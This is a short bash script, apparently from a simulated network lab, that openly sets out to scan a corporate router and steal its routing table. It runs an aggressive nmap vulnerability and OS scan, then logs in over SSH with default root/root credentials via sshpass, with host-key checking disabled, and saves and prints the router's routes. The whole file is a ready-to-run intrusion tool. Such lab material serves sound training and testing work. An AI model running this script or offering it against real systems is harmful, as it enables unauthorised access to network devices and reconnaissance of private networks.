#!/bin/bash
#
# router-nmap.sh — Scan the corporate router and steal its routing table via SSH.
#
# Args (all optional; env vars are used as fallback):
#   $1  ROUTER_IP  — IP of the router to scan/SSH into
#   $2  SSH_USER   — SSH username          (default: root)
#   $3  SSH_PASS   — SSH password          (default: root)
#
# Env vars injected automatically by the topology (build_topology_env):
#   CONTAINER_CORP_ROUTER_IP, CONTAINER_GATEWAY_IP, etc.

ROUTER_IP="${1:-${CONTAINER_CORP_ROUTER_IP:-${CONTAINER_GATEWAY_IP:-}}}"
SSH_USER="${2:-root}"
SSH_PASS="${3:-root}"

if [[ -z "$ROUTER_IP" ]]; then
    echo "[!] No router IP provided. Pass as \$1 or set CONTAINER_CORP_ROUTER_IP env var."
    exit 1
fi

echo "Scanning router $ROUTER_IP for exposed services..."
nmap -sV -O --script=vuln "$ROUTER_IP" -T5

echo "SSH is open, attempting to connect..."
sshpass -p "$SSH_PASS" ssh -o StrictHostKeyChecking=no "$SSH_USER@$ROUTER_IP" "ip route" > ~/routes.txt
echo "Routes saved to ~/routes.txt"
echo "------------------------------"
echo "Contents of routes.txt:"
cat ~/routes.txt
